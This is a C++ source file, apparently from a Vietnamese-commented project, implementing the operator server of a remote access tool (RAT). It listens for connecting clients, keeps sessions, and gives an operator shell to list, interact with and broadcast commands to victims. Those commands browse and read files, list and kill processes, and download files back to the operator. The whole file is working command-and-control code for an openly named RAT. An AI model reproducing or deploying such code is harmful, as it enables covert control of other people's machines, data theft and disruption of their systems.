#include "server.h"

#include <iostream>
#include <sstream>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include <future>
#include <vector>
#include <iomanip>
#include <poll.h>

namespace RAT
{
    // Khởi tạo Server với port
    Server::Server(int port)
        : server_fd_(-1), port_(port), is_running_(false) {}
    Server::~Server()
    {
        stop();
    }

    // Khởi tạo Socket, bind và listen
    bool Server::start()
    {
        // Tạo socket TCP IPv4
        server_fd_ = ::socket(AF_INET, SOCK_STREAM, 0);
        if (server_fd_ < 0)
        {
            std::cerr << Status::ERR << "Khong the tao server socket!\n";
            return false;
        }

        // Thiết lập SO_REUSEADDR để tránh lỗi "Address already in use" khi restart server nhanh
        int opt = 1;
        if (setsockopt(server_fd_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
        {
            std::cerr << Status::ERR << "Loi setsockopt(SO_REUSEADDR)!\n";
            stop();
            return false;
        }

        // Cấu hình địa chỉ IP và port
        struct sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = INADDR_ANY; // Lắng nghe trên mọi card mạng
        server_addr.sin_port = htons(port_);

        // Bind socket với địa chỉ IP và port
        if (::bind(server_fd_, reinterpret_cast<struct sockaddr *>(&server_addr), sizeof(server_addr)) < 0)
        {
            std::cerr << Status::ERR << "Loi bind vao port " << port_ << ": " << std::strerror(errno) << "\n";
            stop();
            return false;
        }

        // Bắt đầu lắng nghe kết nối từ client (max 5)
        if (::listen(server_fd_, 5) < 0)
        {
            std::cerr << Status::ERR << "Loi listen tren socket!\n";
            stop();
            return false;
        }

        is_running_ = true;
        // Khởi chạy Acceptor Thread chạy ngầm
        acceptor_thread_ = std::thread(&Server::acceptor_worker, this);

        std::cout << Status::OK << "Server dang lang nghe tren port " << port_ << "...\n";
        return true;
    }

    // Kết nối client
    void Server::acceptor_worker()
    {
        while (is_running_)
        {
            struct pollfd pfd{};
            pfd.fd = server_fd_;
            pfd.events = POLLIN;

            // Chờ kết nối với timeout 100ms để kiểm tra cờ is_running_ định kỳ
            int poll_ret = ::poll(&pfd, 1, 100);
            if (poll_ret < 0)
            {
                if (errno == EINTR)
                    continue;
                break;
            }
            if (poll_ret == 0)
            {
                // Hết 100ms mà không có kết nối mới -> lặp lại để kiểm tra is_running_
                continue;
            }

            if (pfd.revents & POLLIN)
            {
                // Chấp nhận kết nối từ client
                struct sockaddr_in client_addr{};
                socklen_t client_len = sizeof(client_addr);
                int client_fd = ::accept(server_fd_, reinterpret_cast<struct sockaddr *>(&client_addr), &client_len);

                if (client_fd < 0)
                {
                    if (!is_running_)
                        break;
                    continue;
                }

                // Lấy IP và Port của client
                char ip_buffer[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &client_addr.sin_addr, ip_buffer, sizeof(ip_buffer));
                int client_port = ntohs(client_addr.sin_port);
                int id = session_manager_.add_session(client_fd, ip_buffer, client_port);
                std::cout << "\n"
                          << Status::OK << "Client moi ket noi! [ID: " << id << "] tu "
                          << ip_buffer << ":" << client_port << "\nRAT-Manager> " << std::flush;
            }
        }
    }

    // Command manager
    void Server::print_manager_help()
    {
        std::cout << "\n==================== RAT MANAGER COMMANDS ====================\n"
                  << "  SESSIONS                 : Xem danh sach Client dang ket noi\n"
                  << "  INTERACT <id>            : Dieu khien Client theo ID\n"
                  << "  BROADCAST <command>      : Phat lenh toi tat ca Client\n"
                  << "  HELP                     : Hien thi danh sach lenh \n"
                  << "  EXIT                     : Dong tat ca Client va tat Server\n"
                  << "===============================================================\n\n";
    }

    // Liệt kê danh sách Client kết nối
    void Server::list_sessions()
    {
        // Quét kiểm tra các client trước khi in danh sách
        auto current_sessions = session_manager_.get_all_sessions();
        for (const auto &[id, session] : current_sessions)
        {
            char buf;
            ssize_t res;
            {
                std::lock_guard<std::mutex> lock(session->socket_mtx);
                res = ::recv(session->socket_fd, &buf, 1, MSG_PEEK | MSG_DONTWAIT);
            }
            // res == 0: Client đã gửi gói tin TCP FIN đóng kết nối (ví dụ bấm Ctrl+C)
            // res < 0 và errno khác EAGAIN/EWOULDBLOCK: Socket bị lỗi hoặc đứt kết nối
            if (res == 0 || (res < 0 && errno != EAGAIN && errno != EWOULDBLOCK))
            {
                session_manager_.remove_session(id);
            }
        }

        auto sessions = session_manager_.get_all_sessions();

        // Nếu ds rỗng
        if (sessions.empty())
        {
            std::cout << Status::INFO << "Hien tai khong co Client nao ket noi.\n";
            return;
        }

        // In header ds
        std::cout << "\n"
                  << std::left << std::setw(6) << "ID"
                  << std::setw(18) << "IP ADDRESS"
                  << std::setw(10) << "PORT"
                  << "STATUS\n";
        std::cout << std::string(45, '-') << "\n";

        // In thông tin ds
        for (const auto &[id, session] : sessions)
        {
            std::cout << std::left << std::setw(6) << session->id
                      << std::setw(18) << session->ip
                      << std::setw(10) << session->port
                      << "Active\n";
        }
        std::cout << "\nTong so Client connect: " << sessions.size() << "\n\n";
    }

    // Điều khiển client <ID>
    void Server::interact_session(int session_id)
    {
        auto session = session_manager_.get_session(session_id);

        // Kiểm tra session có client theo ID
        if (!session)
        {
            std::cout << Status::ERR << "Khong tim thay Client voi ID: " << session_id << "\n";
            return;
        }

        std::cout << Status::INFO << "Da ket noi truc tiep toi Client #" << session->id
                  << " [" << session->ip << ":" << session->port << "]\n";
        std::cout << Status::INFO << "'BACK' de quay lai Menu Manager, 'HELP' de xem cac lenh.\n\n";

        // Tương tác trực tiếp với client
        run_client_shell(session);
    }

    void Server::run_client_shell(std::shared_ptr<ClientSession> session)
    {
        while (is_running_)
        {
            std::cout << "RAT-Shell [Client " << session->id << "]> " << std::flush;
            std::string line;

            if (!std::getline(std::cin, line))
                break;
            if (line.empty())
                continue;

            // Lệnh BACK: Thoát về Manager
            if (line == "BACK" || line == "back")
            {
                std::cout << Status::INFO << "Quay tro ve Menu RAT-Manager.\n";
                break;
            }

            // Kiểm tra command
            std::string cmd_name, cmd_args;
            if (!validate_and_process_command(line, cmd_name, cmd_args))
                continue;

            // Khóa an toàn cho luồng truyền socket
            std::lock_guard<std::mutex> lock(session->socket_mtx);
            // Xử lý DOWNLOAD_FILE
            if (cmd_name == Command::DOWNLOAD_FILE)
            {
                std::istringstream iss(cmd_args);
                std::string remote_path, local_path;
                iss >> remote_path >> local_path;
                std::string req = Command::DOWNLOAD_FILE + " " + remote_path;
                if (!send_message(session->socket_fd, req))
                {
                    std::cerr << Status::ERR << "Mat ket noi toi Client!\n";
                    session_manager_.remove_session(session->id);
                    break;
                }
                recv_file_stream(session->socket_fd, local_path);
                continue;
            }

            // Gửi lệnh thông thường
            std::string full_cmd = cmd_name;
            if (!cmd_args.empty())
                full_cmd += " " + cmd_args;
            if (!send_message(session->socket_fd, full_cmd))
            {
                std::cerr << Status::ERR << "Mat ket noi toi Client!\n";
                session_manager_.remove_session(session->id);
                break;
            }
            if (cmd_name == Command::EXIT)
            {
                std::cout << Status::INFO << "Client #" << session->id << " da dong ket noi.\n";
                session_manager_.remove_session(session->id);
                break;
            }
            std::string response;
            if (!recv_message(session->socket_fd, response))
            {
                std::cerr << Status::ERR << "Mat ket noi toi Client!\n";
                session_manager_.remove_session(session->id);
                break;
            }
            std::cout << response << "\n";
        }
    }

    // Broadcast tới các Client
    void Server::broadcast_command(const std::string &cmd_line)
    {
        std::istringstream iss(cmd_line);
        std::string b_cmd;
        if (!(iss >> b_cmd))
        {
            std::cout << Status::ERR << "Lenh broadcast rong!\n";
            return;
        }

        // Không cho phép broadcast các lệnh không phù hợp
        if (b_cmd == Command::DOWNLOAD_FILE)
        {
            std::cout << Status::ERR << "Khong the BROADCAST lenh DOWNLOAD_FILE! Vui long dung INTERACT de tai file tu tung Client.\n";
            return;
        }
        if (b_cmd == Command::HELP)
        {
            std::cout << HELP_TEXT;
            return;
        }

        // Kiểm tra ds client
        auto sessions = session_manager_.get_all_sessions();
        if (sessions.empty())
        {
            std::cout << Status::INFO << "Hien tai khong co Client nao de gui broadcast.\n";
            return;
        }

        std::cout << Status::INFO << "Dang gui broadcast lenh [" << cmd_line << "] toi "
                  << sessions.size() << " clients...\n";

        // Broadcast cho tất cả client
        std::vector<std::future<std::string>> futures;
        for (auto &[id, session] : sessions)
        {
            futures.push_back(std::async(std::launch::async, [this, session, cmd_line]()
                                         {
                // 1. Khóa socket riêng của client
                std::lock_guard<std::mutex> lock(session->socket_mtx);

                // 2. Gửi lệnh
                if (!send_message(session->socket_fd, cmd_line))
                {
                    this->session_manager_.remove_session(session->id);
                    return "[Client #" + std::to_string(session->id) + " (" + session->ip + ")]: Mat ket noi khi gui lenh (Da huy phien)!";
                }

                // 3. Chờ nhận kết quả từ client
                std::string response;
                if (!recv_message(session->socket_fd, response))
                {
                    this->session_manager_.remove_session(session->id);
                    return "[Client #" + std::to_string(session->id) + " (" + session->ip + ")]: Mat ket noi khi nhan phan hoi (Da huy phien)!";
                }

                return "[Client #" + std::to_string(session->id) + " (" + session->ip + ")]:\n" + response; }));
        }
        std::cout << "\n==================== KET QUA BROADCAST ====================\n";
        for (auto &fut : futures)
        {
            std::cout << fut.get() << "\n------------------------------------------------------------\n";
        }
    }

    // Kiểm tra tính hợp lệ của command trước khi gửi qua mạng
    bool Server::validate_and_process_command(const std::string &line, std::string &cmd_name, std::string &cmd_args)
    {
        std::istringstream iss(line);
        if (!(iss >> cmd_name))
        {
            return false; // Dòng trống
        }
        // Đọc phần tham số còn lại (nếu có)
        std::getline(iss >> std::ws, cmd_args);

        // 1. Lệnh HELP:
        if (cmd_name == Command::HELP)
        {
            std::cout << HELP_TEXT;
            return false; // Không gửi sang client
        }
        // 2. Lệnh LIST_DIR: nếu người dùng không nhập đường dẫn thì mặc định là thư mục hiện tại
        if (cmd_name == Command::LIST_DIR)
        {
            if (cmd_args.empty())
            {
                cmd_args = ".";
            }
            return true;
        }
        // 3. Lệnh READ_FILE: bắt buộc phải có tên file / đường dẫn
        if (cmd_name == Command::READ_FILE)
        {
            if (cmd_args.empty())
            {
                std::cout << Status::ERR << "Cu phap dung: READ_FILE <path>\n";
                return false;
            }
            return true;
        }
        // 4. Lệnh LIST_PROC: không cần tham số
        if (cmd_name == Command::LIST_PROC)
        {
            return true;
        }
        // 5. Lệnh KILL_PROC: bắt buộc có PID là số
        if (cmd_name == Command::KILL_PROC)
        {
            if (cmd_args.empty())
            {
                std::cout << Status::ERR << "Cu phap dung: KILL_PROC <PID>\n";
                return false;
            }
            return true;
        }
        // 6. Lệnh EXIT: hợp lệ để gửi đi báo client tắt cùng
        if (cmd_name == Command::EXIT)
        {
            return true;
        }

        // 7. Lệnh DOWNLOAD_FILE: cần có 2 tham số: <remote_path> <local_path>
        if (cmd_name == Command::DOWNLOAD_FILE)
        {
            std::istringstream iss(cmd_args);
            std::string remote_path, local_path;
            if (!(iss >> remote_path >> local_path))
            {
                std::cout << Status::ERR << "Cu phap dung: DOWNLOAD_FILE <remote_path> <local_path>\n";
                return false;
            }
            return true;
        }

        // Lệnh không nhận diện được
        std::cout << Status::ERR << "Lenh khong hop le! 'HELP' de xem danh sach lenh.\n";
        return false;
    }

    // RAT Shell
    void Server::run_shell()
    {
        print_manager_help();

        while (is_running_)
        {
            std::cout << "RAT-Manager> " << std::flush;

            std::string line;
            if (!std::getline(std::cin, line))
                break;
            if (line.empty())
                continue;

            std::istringstream iss(line);
            std::string main_cmd;
            iss >> main_cmd;
            if (main_cmd == "SESSIONS" || main_cmd == "sessions" || main_cmd == "list")
            {
                list_sessions();
            }
            else if (main_cmd == "INTERACT" || main_cmd == "interact")
            {
                int id = -1;
                if (iss >> id)
                {
                    interact_session(id);
                }
                else
                {
                    std::cout << Status::ERR << "Cu phap dung: INTERACT <client_id>\n";
                }
            }
            else if (main_cmd == "BROADCAST" || main_cmd == "broadcast")
            {
                std::string broadcast_args;
                std::getline(iss >> std::ws, broadcast_args);
                if (broadcast_args.empty())
                {
                    std::cout << Status::ERR << "Cu phap dung: BROADCAST <command>\n";
                }
                else
                {
                    broadcast_command(broadcast_args);
                }
            }
            else if (main_cmd == "HELP" || main_cmd == "help")
            {
                print_manager_help();
            }
            else if (main_cmd == "EXIT" || main_cmd == "exit")
            {
                std::cout << Status::INFO << "Dang dong Server va tat ca Client...\n";
                break;
            }
            else
            {
                std::cout << Status::ERR << "Lenh khong hop le!\n";
            }
        }
        stop();
    }

    // Đóng socket
    void Server::stop()
    {
        if (!is_running_ && server_fd_ < 0)
        {
            return;
        }

        is_running_ = false;

        // Đóng server socket để ngắt lắng nghe kết nối mới
        close_socket(server_fd_);

        // Đợi luồng acceptor dừng hoàn toàn (poll timeout 100ms đảm bảo luồng thoát ngay)
        if (acceptor_thread_.joinable())
        {
            acceptor_thread_.join();
        }

        // Gửi thông báo EXIT cho tất cả Client đang online trước khi ngắt socket
        auto sessions = session_manager_.get_all_sessions();
        for (auto &[id, session] : sessions)
        {
            std::lock_guard<std::mutex> lock(session->socket_mtx);
            send_message(session->socket_fd, Command::EXIT);
        }

        // Đóng toàn bộ socket của các Client
        session_manager_.close_all();
    }
}